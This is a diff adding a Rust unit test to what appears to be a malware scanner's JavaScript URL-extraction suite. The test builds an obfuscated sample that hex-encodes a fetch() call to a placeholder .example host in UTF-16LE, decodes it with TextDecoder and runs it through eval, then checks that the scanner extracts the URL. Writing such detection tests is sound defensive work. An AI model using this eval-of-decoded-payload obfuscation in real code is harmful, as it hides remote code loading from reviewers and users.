@@ -14616,6 +14616,33 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_bound_utf16le_buffer_from_hex_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-bound-utf16le-buffer-hex-js.example/p')";
+        let encoded = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| format!("{byte:02x}"))
+            .collect::<String>();
+        let js = format!(
+            r#"var b = Buffer.from("{encoded}", "hex"); eval(new TextDecoder("utf-16le").decode(b))"#
+        )
+        .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-bound-utf16le-buffer-hex-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder bound UTF-16LE Buffer.from(hex) payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_textdecoder_bound_uint8array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://textdecoder-bound-uint8array-js.example/p')";
